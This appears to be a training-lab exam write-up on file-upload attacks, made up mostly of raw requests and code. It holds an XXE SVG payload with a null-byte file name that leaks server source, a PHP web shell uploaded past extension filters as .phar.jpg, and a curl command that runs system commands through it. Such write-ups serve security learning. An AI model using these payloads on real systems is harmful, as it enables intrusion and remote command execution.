# Exam

We upload following image to leak the source code of the image:
```html
POST /contact/upload.php HTTP/1.1
Host: 83.136.251.105:46294
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----geckoformboundary3cf5abb5ab3b4956f1b87e3ccbe546d
Content-Length: 377
Origin: http://83.136.251.105:46294
Connection: keep-alive
Referer: http://83.136.251.105:46294/contact/
Priority: u=0

------geckoformboundary3cf5abb5ab3b4956f1b87e3ccbe546d
Content-Disposition: form-data; name="uploadFile"; filename="cat4.php\x00.png"
Content-Type: image/svg

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
------geckoformboundary3cf5abb5ab3b4956f1b87e3ccbe546d--
```

This leaks following source code
```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```

From reading the source code we can seee an upload of a file `cat_small.jpeg` will be available:
```
http://83.136.252.32:34253/contact/user_feedback_submissions/251222_cat_small.jpeg
```

Now let's try uploading a shell...
We uploaded the shell using the following POST request:
```
POST /contact/upload.php HTTP/1.1
Host: 83.136.251.105:53790
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----geckoformboundaryb98522d83fcd88b8dbe475e2ee117e8
Content-Length: 256
Origin: http://83.136.251.105:53790
Connection: keep-alive
Referer: http://83.136.251.105:53790/contact/
Priority: u=0

------geckoformboundaryb98522d83fcd88b8dbe475e2ee117e8
Content-Disposition: form-data; name="uploadFile"; filename="shell2.phar.jpg"
Content-Type: image/jpeg

ÿØÿ<?php system($_GET["cmd"]); ?>
------geckoformboundaryb98522d83fcd88b8dbe475e2ee117e8--
```

Notice the `.phar.jpg` extension is not blocked and is ran by the server apperantly...
We can run system command on the backend server now via:
```
curl http://83.136.251.105:53790/contact/user_feedback_submissions/251223_shell2.phar.jpg?cmd=id
```
